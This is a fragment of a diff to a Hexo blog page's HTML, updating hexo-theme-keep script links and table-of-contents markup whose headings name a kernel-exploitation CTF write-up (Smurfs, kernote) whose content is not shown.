-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E6%BC%94%E7%A4%BA"><span class="nav-text">例题演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2022-%E8%93%9D%E5%B8%BD%E6%9D%AF-%E5%8D%8A%E5%86%B3%E8%B5%9B-Smurfs"><span class="nav-text">2022 蓝帽杯 半决赛 Smurfs</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bypass-kpti"><span class="nav-text">bypass kpti</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8C%E5%BE%97%E5%87%BAexp"><span class="nav-text">综上，得出exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0CTF-2021-final-kernote"><span class="nav-text">0CTF 2021 final kernote</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8C%E5%BE%97%E5%87%BAexp-1"><span class="nav-text">综上，得出exp</span></a></li></ol></li></ol></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
 
 
+    <!-- local search -->
     
         <div class="search-pop-overlay">
     <div class="popup search-popup">
@@ -657,7 +806,7 @@
                        class="search-input"
                 >
             </div>
-            <span class="popup-btn-close">
+            <span class="close-popup-btn">
                 <i class="fas fa-times"></i>
             </span>
         </div>
@@ -671,29 +820,76 @@
 
     
 
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E6%BC%94%E7%A4%BA"><span class="nav-text">例题演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2022-%E8%93%9D%E5%B8%BD%E6%9D%AF-%E5%8D%8A%E5%86%B3%E8%B5%9B-Smurfs"><span class="nav-text">2022 蓝帽杯 半决赛 Smurfs</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bypass-kpti"><span class="nav-text">bypass kpti</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8C%E5%BE%97%E5%87%BAexp"><span class="nav-text">综上，得出exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0CTF-2021-final-kernote"><span class="nav-text">0CTF 2021 final kernote</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8C%E5%BE%97%E5%87%BAexp-1"><span class="nav-text">综上，得出exp</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
 </main>
 
 
 
-<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
 
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>
 
 
+<!-- lazyload -->
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
-
-
-
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>
 
 
-<div class="post-scripts">
+<div class="">
+    <!-- home page -->
     
-        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
     
 </div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
 
 
 
